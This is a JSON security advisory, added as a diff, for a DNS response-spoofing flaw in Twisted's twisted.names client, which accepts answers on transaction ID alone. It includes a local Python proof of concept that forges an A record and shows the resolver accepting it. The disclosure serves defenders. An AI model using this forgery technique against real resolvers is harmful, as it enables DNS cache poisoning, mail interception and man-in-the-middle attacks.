@@ -1,0 +1,175 @@
+{
+  "id": "GHSA-jj36-9pvh-vj5r",
+  "modified": "2026-10-27T15:00:04.513526274Z",
+  "published": "2026-10-27T14:45:29Z",
+  "aliases": [
+    "CVE-2026-83813"
+  ],
+  "summary": "Twisted: DNS Response Spoofing in twisted.names Due to Missing Source Address Validation",
+  "details": "### Summary\n\n`twisted.names.dns.DNSDatagramProtocol`, the UDP transport used by twisted's DNS client (`twisted.names.client.Resolver`, `createResolver`, and anything built on it, including MX lookups in `twisted.mail`), accepts a DNS response for a pending query solely on the basis of the 16-bit transaction ID matching. It never checks that the response actually originated from the server the query was sent to. Any host that can deliver a UDP packet to the resolver's listening port with the correct transaction ID can inject a forged answer, independent of the real server's address. This is a materially weaker defense than standard DNS resolver practice (transaction ID plus source-address validation, typically also source-port rotation), and enables off-path DNS response spoofing / cache poisoning.\n\n### Details\n\n`DNSDatagramProtocol.datagramReceived` (`src/twisted/names/dns.py`, line 3350) is:\n\n```python\ndef datagramReceived(self, data, addr):\n    \"\"\"\n    Read a datagram, extract the message in it and trigger the associated\n    Deferred.\n    \"\"\"\n    m = Message()\n    try:\n        m.fromStr(data)\n    except EOFError:\n        ...\n    except ValueError as ex:\n        ...\n    except BaseException:\n        ...\n\n    if m.id in self.liveMessages:\n        d, canceller = self.liveMessages[m.id]\n        del self.liveMessages[m.id]\n        canceller.cancel()\n        try:\n            d.callback(m)\n        except BaseException:\n            log.err()\n    else:\n        if m.id not in self.resends:\n            self.controller.messageReceived(m, self, addr)\n```\n\nThe `addr` parameter, the UDP source address of the datagram, is accepted but never compared against the address the corresponding query was sent to. The only check is `m.id in self.liveMessages`, and `liveMessages` is keyed purely by the transaction ID chosen in `DNSMixin.pickID()`. The listening socket is a plain `listenUDP(0, self, maxPacketSize=512)` (line 3348), not connected to the queried server, so the kernel does not filter by source address either; any host can deliver a UDP datagram to this socket.\n\nThe transaction ID itself is generated with `secureRandom` (`randomSource()`, line 174), so it is not predictable, but at 16 bits it is a 1-in-65536 space per attempt. `twisted.names.client.Resolver`, the standard, documented DNS client, mitigates brute-force guessing of that space by creating a brand-new `DNSDatagramProtocol` bound to a fresh, independently random source port (`_connectedProtocol()`, `src/twisted/names/client.py` line 206, using `dns.randomSource()`) for every individual query, and tearing the socket down once the query completes (`_query()`, line 253). This gives an off-path attacker roughly 32 bits of combined entropy (port and transaction ID) to guess per query issued through the standard client, not just the 16 bits of the transaction ID alone.\n\nThe missing source-address check is still a real gap for two reasons. First, it removes a defense-in-depth backstop that DNS resolver best practice (RFC 5452) treats as independent from port and ID randomization; an attacker who is on-path, shares a broadcast domain or NAT with the resolver or the real DNS server, or is otherwise able to observe or narrow the ephemeral port faces no additional barrier at all, since source-address validation is exactly the check that would stop them. Second, `DNSDatagramProtocol` is itself a public, documented class; code that constructs one directly and issues more than one query against the same instance, rather than going through `client.Resolver`'s per-query protocol and port cycling, reuses the same source port for every query after the first, so guessing the 16-bit transaction ID alone is sufficient from that point on.\n\n`twisted.names.client.Resolver` uses this same `DNSDatagramProtocol` class for every UDP query it issues, so every consumer of the standard twisted DNS client, including `twisted.mail`'s MX resolution, is subject to the same unauthenticated accept logic in `datagramReceived`, moderated by the per-query port rotation described above.\n\n### PoC\n\n```python\nimport socket\nfrom twisted.internet import reactor\nfrom twisted.names import dns\n\nclass CapturingController:\n    def messageReceived(self, message, protocol, address):\n        pass\n\ndef main():\n    resolverProto = dns.DNSDatagramProtocol(CapturingController())\n    resolverProto.startListening()\n\n    real_server = (\"203.0.113.1\", 53)  # RFC 5737 TEST-NET-1, never answers\n    query = dns.Query(b\"victim.example.com\", dns.A, dns.IN)\n    d = resolverProto.query(real_server, [query], timeout=5)\n\n    stolen_id = next(iter(resolverProto.liveMessages))\n    resolver_port = resolverProto.transport.getHost().port\n\n    forged = dns.Message(stolen_id, answer=1)\n    forged.queries = [query]\n    forged.answers = [\n        dns.RRHeader(name=b\"victim.example.com\", type=dns.A, cls=dns.IN, ttl=60,\n                     payload=dns.Record_A(address=\"6.6.6.6\"))\n    ]\n\n    attacker_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    attacker_sock.bind((\"127.0.0.1\", 0))  # unrelated to real_server\n    attacker_sock.sendto(forged.toStr(), (\"127.0.0.1\", resolver_port))\n\n    def onResult(message):\n        print(\"Resolver ACCEPTED forged response as the answer to its query to\", real_server)\n        print(\"Spoofed A record:\", message.answers[0].payload.dottedQuad())\n        reactor.stop()\n\n    d.addCallback(onResult)\n\nreactor.callWhenRunning(main)\nreactor.run()\n```\n\nOutput:\n\n```\nResolver listening on 127.0.0.1:54997, queried ('203.0.113.1', 53), id=6995\nForged response sent from ('127.0.0.1', 53644) (NOT ('203.0.113.1', 53))\nResolver ACCEPTED forged response as the answer to its query to ('203.0.113.1', 53)\nSpoofed A record: 6.6.6.6\n```\n\nThe query was sent to `203.0.113.1:53`, an address reserved by RFC 5737 for documentation and testing that will never respond. The forged response was sent from an unrelated local UDP socket bound to a different, unrelated port. The resolver accepted it as the legitimate answer purely because the transaction ID matched, proving the response's source address plays no role in validation.\n### Impact\n\nAny application resolving hostnames through `twisted.names` can have DNS answers forged by a network party able to deliver a UDP packet to the resolver's listening port with the correct transaction ID, and, for the standard `client.Resolver` path, the correct ephemeral source port too. An on-path attacker, or one sharing a broadcast domain or NAT with the resolver or the real DNS server, faces no meaningful barrier at all, since source-address validation is exactly the check that would stop them and it is absent. An off-path attacker targeting the standard `client.Resolver` API must win a roughly 32-bit combined guess (port and transaction ID) within the query timeout window; the same attacker targeting code that uses the public `DNSDatagramProtocol` class directly across multiple queries on one instance, a supported usage pattern, faces only the 16-bit transaction ID space per query after the first. A successful forgery lets an attacker redirect hostname resolution to an address of their choosing, enabling mail interception (spoofed MX/A records), SSRF, or man-in-the-middle positioning against anything that trusts the resolved address.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "twisted",
+        "purl": "pkg:pypi/twisted"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "26.10.0rc1"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.0.1",
+        "1.0.3",
+        "1.0.4",
+        "1.0.5",
+        "1.0.6",
+        "1.0.7",
+        "1.1.0",
+        "1.1.1",
+        "1.2.0",
+        "10.0.0",
+        "10.1.0",
+        "10.2.0",
+        "11.0.0",
+        "11.1.0",
+        "12.0.0",
+        "12.1.0",
+        "12.2.0",
+        "12.3.0",
+        "13.0.0",
+        "13.1.0",
+        "13.2.0",
+        "14.0.0",
+        "14.0.1",
+        "14.0.2",
+        "15.0.0",
+        "15.1.0",
+        "15.2.0",
+        "15.2.1",
+        "15.3.0",
+        "15.4.0",
+        "15.5.0",
+        "16.0.0",
+        "16.1.0",
+        "16.1.1",
+        "16.2.0",
+        "16.3.0",
+        "16.3.1",
+        "16.3.2",
+        "16.4.0",
+        "16.4.1",
+        "16.5.0",
+        "16.5.0rc1",
+        "16.5.0rc2",
+        "16.6.0",
+        "16.6.0rc1",
+        "16.7.0rc1",
+        "16.7.0rc2",
+        "17.1.0",
+        "17.1.0rc1",
+        "17.5.0",
+        "17.9.0",
+        "17.9.0rc1",
+        "18.4.0",
+        "18.4.0rc1",
+        "18.7.0",
+        "18.7.0rc1",
+        "18.7.0rc2",
+        "18.9.0",
+        "18.9.0rc1",
+        "19.10.0",
+        "19.10.0rc1",
+        "19.2.0",
+        "19.2.0rc1",
+        "19.2.0rc2",
+        "19.2.1",
+        "19.7.0",
+        "19.7.0rc1",
+        "2.1.0",
+        "2.4.0",
+        "2.5.0",
+        "20.3.0",
+        "20.3.0rc1",
+        "21.2.0",
+        "21.2.0rc1",
+        "21.7.0",
+        "21.7.0rc1",
+        "21.7.0rc2",
+        "21.7.0rc3",
+        "22.1.0",
+        "22.1.0rc1",
+        "22.10.0",
+        "22.10.0rc1",
+        "22.2.0",
+        "22.2.0rc1",
+        "22.4.0",
+        "22.4.0rc1",
+        "22.8.0",
+        "22.8.0rc1",
+        "23.10.0",
+        "23.10.0rc1",
+        "23.8.0",
+        "23.8.0rc1",
+        "24.10.0",
+        "24.10.0rc1",
+        "24.11.0",
+        "24.11.0rc1",
+        "24.11.0rc2",
+        "24.2.0rc1",
+        "24.3.0",
+        "24.7.0",
+        "24.7.0rc1",
+        "24.7.0rc2",
+        "25.5.0",
+        "25.5.0rc1",
+        "26.4.0",
+        "26.4.0rc2",
+        "8.0.0",
+        "8.0.1",
+        "8.1.0",
+        "8.2.0",
+        "9.0.0"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 26.4.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-jj36-9pvh-vj5r/GHSA-jj36-9pvh-vj5r.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/twisted/twisted/security/advisories/GHSA-jj36-9pvh-vj5r"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-83813"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/twisted/twisted/pull/12700"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/twisted/twisted/commit/b53e1c3477c209b5609a1c74cf9e48373b5879ac"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/twisted/twisted"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/twisted/twisted/releases/tag/twisted-26.10.0rc1"
+    }
+  ]
+}
